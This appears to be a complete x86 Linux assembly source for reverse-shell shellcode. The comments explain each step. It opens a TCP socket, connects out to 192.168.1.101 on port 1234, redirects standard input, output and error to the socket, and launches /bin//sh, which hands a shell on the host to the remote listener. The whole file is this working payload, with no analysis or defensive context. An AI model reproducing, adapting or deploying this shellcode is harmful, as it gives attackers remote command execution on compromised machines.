global _start
section .text
_start:
  push 0x66
  pop eax ;syscall
  push 0x1
  pop ebx
  xor edx,edx
  push edx ;protocol IPPROTO_IP (0x0)
  push ebx ;socket_type SOCK_STREAM (0x1)
  push 0x2 ;socket_family AF_INET (0x2)
  mov ecx, esp
  int 0x80
  
  xchg edx, eax; save result (sockfd) for later usage
  mov al, 0x66
  push 0x6501A8C0;sin_addr=192.168.1.101
  push word 0xd204 ;sin_port=1234
  inc ebx
  push word bx ;sin_family=AF_INET (0x2)
  mov ecx, esp ;save pointer to sockaddr struct
  push 0x10 ;addrlen=16
  push ecx ;pointer to sockaddr
  push edx ;sockfd
  mov ecx, esp
  inc ebx ; sys_connect (0x3)
  int 0x80 ;exec sys_connect
  
  push 0x2
  pop ecx
  xchg ebx,edx

loop:
  mov al, 0x3f ;syscall: sys_dup2
  int 0x80 ;execute sys_dup2
  dec ecx ;decrement loop-counter

jns loop;as long as SF is not set -> jmp to loop
mov al, 0x0b
xor ebx,ebx
push ebx
push 0x68732f2f;"hs//" 
push 0x6e69622f;"nib/"
mov ebx, esp
xor ecx, ecx
mov edx, ecx
int 0x80 
